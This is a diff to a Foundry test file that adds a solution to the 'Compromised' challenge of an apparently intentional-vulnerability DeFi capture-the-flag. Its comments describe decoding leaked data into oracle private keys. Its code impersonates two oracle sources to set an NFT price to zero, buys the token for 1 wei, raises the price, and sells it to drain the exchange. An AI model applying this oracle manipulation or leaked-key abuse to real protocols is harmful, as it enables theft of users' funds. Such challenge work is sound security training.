@@ -10,6 +10,8 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -75,8 +77,57 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)
+        // Gives us
+        //  0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        //  0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        // cast wallet address <PRIVATE KEY>
+        // Gives us
+        //  0x188Ea627E3531Db590e6f1D71ED83628d1933088
+        //  0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+
+        // Say that the leak give you two private keys
+        // Explain getMedianPrice and _computeMedianPrice
+        // As they are odd, we can just set these two sources as 0,
+        // and the price becomes zero.
+
+        // Point in the documentation that
+        // In real life, I should send the transaction with cast,
+        // using the private key above.
+        vm.startPrank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        vm.startPrank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        uint256 id = exchange.buyOne{value: 1 wei}();
+
+        vm.startPrank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
     }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
